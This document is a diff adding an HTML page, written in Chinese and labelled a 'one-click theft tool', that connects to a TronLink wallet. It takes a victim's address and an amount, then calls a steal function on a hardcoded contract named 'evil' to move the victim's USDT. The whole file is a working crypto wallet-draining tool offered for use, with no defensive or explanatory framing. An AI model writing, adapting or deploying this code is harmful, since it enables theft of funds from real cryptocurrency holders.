@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>盜取操作面板</title>
+<script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
+</head>
+<body>
+<h2>🛠️ 一鍵盜取工具</h2>
+<input id="victim" placeholder="受害者地址"><br>
+<input id="amount" placeholder="金額（例：1 USDT = 1000000）"><br>
+<button onclick="steal()">執行盜取</button>
+<script>
+const evil = 'TTcT9Q6h7JRtbRXvT4ScEp5htH52ARKkY3';
+
+async function steal() {
+  const tronWeb = window.tronWeb;
+  if (!tronWeb.defaultAddress.base58) {
+    return alert('請先登入 TronLink 錢包');
+  }
+  const victim = document.getElementById('victim').value;
+  const amount = document.getElementById('amount').value;
+  const contract = await tronWeb.contract().at(evil);
+  await contract.steal(victim, amount).send();
+  alert("✅ 轉帳完成！");
+}
+</script>
+</body>
+</html>
